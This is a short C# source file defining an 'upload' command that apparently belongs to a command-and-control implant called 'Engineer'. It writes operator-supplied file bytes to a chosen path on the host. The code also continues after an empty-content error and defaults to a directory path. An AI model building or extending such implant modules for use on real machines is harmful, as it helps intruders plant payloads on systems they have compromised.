using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Upload : EngineerCommand
    {
        public override string Name => "upload";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/dest", out string destination);

                if (string.IsNullOrWhiteSpace(destination))
                {
                    destination = Environment.CurrentDirectory;
                }
                var contentbytes = task.File;
                if(contentbytes.Length == 0)
                {
                    Tasking.FillTaskResults("Error: Missing file content to upload", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                }
                File.WriteAllBytes(destination, contentbytes);
                Tasking.FillTaskResults("file uploaded at " + destination, task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
